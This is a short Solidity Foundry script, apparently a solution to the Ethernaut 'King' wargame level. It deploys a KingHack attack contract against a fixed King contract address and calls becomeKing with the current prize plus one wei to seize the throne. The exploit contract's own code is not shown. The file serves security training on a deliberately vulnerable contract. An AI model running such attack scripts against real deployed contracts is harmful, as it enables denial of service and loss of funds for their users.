// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/KingHack.sol";
import "../src/King.sol";

contract KingHackScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    address kingAddress = payable(address(0x2051935bBa1ca07084D11e8Fb9d5fcC8d37e7511));
    King kingContract = King(payable(address(kingAddress)));

    // Deploy king hack
    vm.startBroadcast(attackerPrivateKey);
    KingHack kingHackConrtact = new KingHack(kingAddress);
    
    uint prize = kingContract.prize();
    console.log("prize to beat", prize);
    uint submission = prize + 0.000000000000000001 ether;
    console.log("our submission to beat it", submission);

    console.log("king", kingContract._king());
    kingHackConrtact.becomeKing{value: submission}();
    console.log("king now", kingContract._king());
  }
}
